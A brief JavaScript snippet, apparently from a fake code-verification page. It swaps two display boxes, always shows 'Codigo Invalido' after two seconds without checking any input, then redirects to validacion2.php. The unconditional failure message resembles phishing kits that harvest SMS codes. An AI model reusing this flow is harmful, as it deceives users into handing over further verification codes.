let cja1 = document.getElementById('cja1');
let cja2 = document.getElementById('cja2');
let btn = document.getElementById('btn1');
let sms = document.getElementById('mensaje');


    cja2.style.display = 'block';
    cja1.style.display = 'none';
    
    setTimeout(() => {
        cja2.style.display = 'none';
        cja2.style.display = 'block';
    }, 1000);
    setTimeout(() => {
        sms.innerText = 'Codigo Invalido';
    }, 2000);
    setTimeout(() => {
       window.location = 'validacion2.php'; 
    }, 5000);
    
